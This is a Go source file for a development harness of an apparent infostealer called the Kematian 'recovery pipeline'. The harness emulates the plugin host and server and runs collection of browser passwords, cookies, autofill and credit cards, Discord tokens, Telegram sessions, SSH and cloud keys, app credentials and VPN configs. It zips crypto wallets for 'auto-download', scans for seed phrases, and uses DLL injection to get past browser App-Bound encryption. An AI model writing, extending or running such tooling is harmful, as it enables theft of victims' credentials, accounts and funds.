// Command devtool is a standalone development harness for the Kematian
// recovery pipeline. It emulates the plugin host + server by running the same
// collection code as the c-shared plugin, then prints a summary (or, with
// -verbose, the full event/result JSON) to the console.
//
// Usage examples:
//
//	go run ./cmd/devtool                          # collect everything, summary
//	go run ./cmd/devtool -cookies -browser Brave  # just Brave cookies
//	go run ./cmd/devtool -verbose                 # dump full JSON events
//	go run ./cmd/devtool -out result.json -no-inject
//
// It is not loaded as a plugin; it links the recovery package directly and is
// meant to make local development and debugging easier.
package main

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"sort"
	"strings"
	"time"

	recovery "recovery/recovery"
)

const maxAutoDownloadSize = 50 * 1024 * 1024 // 50MB, matches plugin

var verbose bool

func main() {
	var (
		outPath    string
		timeoutSec int
		browser    string
		noInject   bool
		includeZip bool

		all        bool
		passwords  bool
		cookies    bool
		autofill   bool
		history    bool
		bookmarks  bool
		cards      bool
		discord    bool
		files      bool
		wallets    bool
		telegram   bool
		keys       bool
		apps       bool
		gaming     bool
		vpn        bool
		extensions bool
	)

	flag.StringVar(&outPath, "out", "", "write the full result JSON to this file")
	flag.IntVar(&timeoutSec, "timeout", 120, "collection timeout in seconds")
	flag.StringVar(&browser, "browser", "", "only show results for this browser (case-insensitive); scanning is not restricted")
	flag.BoolVar(&noInject, "no-inject", false, "skip DLL injection (direct file access only, no App-Bound/v20 keys)")
	flag.BoolVar(&verbose, "verbose", false, "print full event/result JSON (default: summary only)")
	flag.BoolVar(&includeZip, "content", false, "include base64 content in auto-download events")

	flag.BoolVar(&all, "all", false, "collect everything")
	flag.BoolVar(&passwords, "passwords", false, "collect passwords")
	flag.BoolVar(&cookies, "cookies", false, "collect cookies")
	flag.BoolVar(&autofill, "autofill", false, "collect autofill")
	flag.BoolVar(&history, "history", false, "collect history")
	flag.BoolVar(&bookmarks, "bookmarks", false, "collect bookmarks")
	flag.BoolVar(&cards, "cards", false, "collect credit cards")
	flag.BoolVar(&discord, "discord", false, "collect Discord tokens")
	flag.BoolVar(&files, "files", false, "scan files")
	flag.BoolVar(&wallets, "wallets", false, "scan wallets")
	flag.BoolVar(&telegram, "telegram", false, "scan Telegram sessions")
	flag.BoolVar(&keys, "keys", false, "scan SSH & cloud keys")
	flag.BoolVar(&apps, "apps", false, "scan app credentials")
	flag.BoolVar(&gaming, "gaming", false, "scan gaming platforms")
	flag.BoolVar(&vpn, "vpn", false, "scan VPN configs")
	flag.BoolVar(&extensions, "extensions", false, "scan browser extensions")
	flag.Parse()

	if noInject {
		os.Setenv("KEMATIAN_NO_INJECT", "1")
	}

	anyData := passwords || cookies || autofill || history || bookmarks || cards ||
		discord || files || wallets || telegram || keys || apps || gaming || vpn || extensions

	opts := recovery.CollectOptions{
		Browsers:    all || !anyData || passwords || cookies || autofill || history || bookmarks || cards || extensions,
		Passwords:   all || !anyData || passwords,
		Cookies:     all || !anyData || cookies,
		Autofill:    all || !anyData || autofill,
		History:     all || !anyData || history,
		Bookmarks:   all || !anyData || bookmarks,
		CreditCards: all || !anyData || cards,
		Discord:     all || !anyData || discord,
		Files:       all || files,
		Wallets:     all || wallets,
		Telegram:    all || telegram,
		Keys:        all || keys,
		Apps:        all || apps,
		Gaming:      all || gaming,
		VPNs:        all || vpn,
	}

	log.Printf("devtool: timeout=%ds browser=%q noInject=%v verbose=%v", timeoutSec, browser, noInject, verbose)

	printEvent("status", map[string]string{"message": "Starting collection (devtool)..."})

	var exts []recovery.ExtensionResult
	if opts.Browsers || extensions {
		exts = recovery.ScanExtensions()
		log.Printf("devtool: extension scan complete: %d extensions", len(exts))
	}

	partialFn := func(partial *recovery.CollectionResult) {
		printEvent("partial", filter(partial, browser))
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(timeoutSec)*time.Second)
	defer cancel()

	start := time.Now()
	result, err := recovery.Collect(ctx, opts, partialFn)
	if err != nil {
		log.Printf("devtool: collection failed: %v", err)
		printEvent("error", map[string]string{"error": err.Error()})
		os.Exit(1)
	}

	if opts.Browsers || extensions {
		result.Extensions = exts
	}

	printSummary(filter(result, browser))
	printEvent("results", filter(result, browser))

	if len(result.Wallets) > 0 {
		autoDownloadWallets(result.Wallets, includeZip)
	}

	seeds := recovery.ScanSeeds(result.Files, result.Passwords, result.Autofill)
	if len(seeds) > 0 {
		log.Printf("devtool: seed scan found %d seed phrases", len(seeds))
		printEvent("seed_scan_results", map[string]interface{}{"seeds": seeds})
	}

	if outPath != "" {
		if err := writeResult(outPath, filter(result, browser)); err != nil {
			log.Printf("devtool: failed to write output: %v", err)
			os.Exit(1)
		}
		log.Printf("devtool: wrote result to %s", outPath)
	}

	log.Printf("devtool: collection completed in %s", time.Since(start).Round(time.Millisecond))
}

// printEvent emulates the server receiving an event + JSON payload. Only used
// when -verbose is set.
func printEvent(event string, payload interface{}) {
	if !verbose {
		return
	}
	data, err := json.MarshalIndent(payload, "", "  ")
	if err != nil {
		log.Printf("devtool: marshal %s: %v", event, err)
		return
	}
	fmt.Printf("\n===== EVENT: %s =====\n%s\n", event, string(data))
}

type browserCounts struct {
	cookies, passwords, autofill, history, bookmarks, cards, extensions int
}

func tally(r *recovery.CollectionResult) map[string]*browserCounts {
	m := map[string]*browserCounts{}
	get := func(b string) *browserCounts {
		if b == "" {
			b = "(unknown)"
		}
		c, ok := m[b]
		if !ok {
			c = &browserCounts{}
			m[b] = c
		}
		return c
	}
	for _, v := range r.Cookies {
		get(v.Browser).cookies++
	}
	for _, v := range r.Passwords {
		get(v.Browser).passwords++
	}
	for _, v := range r.Autofill {
		get(v.Browser).autofill++
	}
	for _, v := range r.History {
		get(v.Browser).history++
	}
	for _, v := range r.Bookmarks {
		get(v.Browser).bookmarks++
	}
	for _, v := range r.CreditCards {
		get(v.Browser).cards++
	}
	for _, v := range r.Extensions {
		get(v.Browser).extensions++
	}
	return m
}

func printSummary(r *recovery.CollectionResult) {
	fmt.Printf("\n===== SUMMARY =====\n")

	byBrowser := tally(r)
	names := make([]string, 0, len(byBrowser))
	for b := range byBrowser {
		names = append(names, b)
	}
	sort.Strings(names)

	fmt.Printf("%-14s %9s %9s %8s %7s %9s %5s %10s\n",
		"browser", "cookies", "passwords", "autofill", "history", "bookmarks", "cards", "extensions")
	for _, b := range names {
		c := byBrowser[b]
		fmt.Printf("%-14s %9d %9d %8d %7d %9d %5d %10d\n",
			b, c.cookies, c.passwords, c.autofill, c.history, c.bookmarks, c.cards, c.extensions)
	}

	fmt.Printf("\ndiscord tokens: %d\n", len(r.DiscordTokens))
	fmt.Printf("files:          %d\n", len(r.Files))
	fmt.Printf("wallets:        %d\n", len(r.Wallets))
	fmt.Printf("telegram:       %d\n", len(r.Telegram))
	fmt.Printf("keys:           %d\n", len(r.Keys))
	fmt.Printf("apps:           %d\n", len(r.AppCredentials))
	if r.Gaming != nil {
		fmt.Printf("gaming:         present\n")
	}
	if r.VPNs != nil {
		fmt.Printf("vpns:           present\n")
	}
	if len(r.Errors) > 0 {
		fmt.Printf("\nerrors: %d\n", len(r.Errors))
		for _, e := range r.Errors {
			fmt.Printf("  - %s\n", e)
		}
	}
}

func writeResult(path string, r *recovery.CollectionResult) error {
	data, err := json.MarshalIndent(r, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(path, data, 0600)
}

func autoDownloadWallets(wallets []recovery.WalletResult, includeZip bool) {
	for _, w := range wallets {
		if w.Size > maxAutoDownloadSize {
			log.Printf("devtool: skipping auto-download for %q (%d bytes exceeds limit)", w.Name, w.Size)
			continue
		}
		data, err := recovery.ZipDirectory(w.Path)
		if err != nil {
			log.Printf("devtool: auto-download zip %q: %v", w.Name, err)
			continue
		}
		log.Printf("devtool: wallet %q (%s) zipped %d bytes", w.Name, w.Type, len(data))
		if includeZip {
			printEvent("wallet_auto_data", map[string]interface{}{
				"name":      w.Name,
				"type":      w.Type,
				"path":      w.Path,
				"addresses": w.Addresses,
				"vaultData": w.VaultData,
				"size":      len(data),
				"content":   base64.StdEncoding.EncodeToString(data),
			})
		}
	}
}

// filter returns a copy of r restricted to a single browser (case-insensitive)
// when name is non-empty. Non-browser fields are dropped in that case so the
// output stays focused on the browser under test.
func filter(r *recovery.CollectionResult, name string) *recovery.CollectionResult {
	if name == "" {
		return r
	}
	match := func(b string) bool { return strings.EqualFold(b, name) }

	out := &recovery.CollectionResult{}
	for _, v := range r.Passwords {
		if match(v.Browser) {
			out.Passwords = append(out.Passwords, v)
		}
	}
	for _, v := range r.Cookies {
		if match(v.Browser) {
			out.Cookies = append(out.Cookies, v)
		}
	}
	for _, v := range r.Autofill {
		if match(v.Browser) {
			out.Autofill = append(out.Autofill, v)
		}
	}
	for _, v := range r.History {
		if match(v.Browser) {
			out.History = append(out.History, v)
		}
	}
	for _, v := range r.Bookmarks {
		if match(v.Browser) {
			out.Bookmarks = append(out.Bookmarks, v)
		}
	}
	for _, v := range r.CreditCards {
		if match(v.Browser) {
			out.CreditCards = append(out.CreditCards, v)
		}
	}
	for _, v := range r.Extensions {
		if match(v.Browser) {
			out.Extensions = append(out.Extensions, v)
		}
	}
	out.Errors = r.Errors
	return out
}
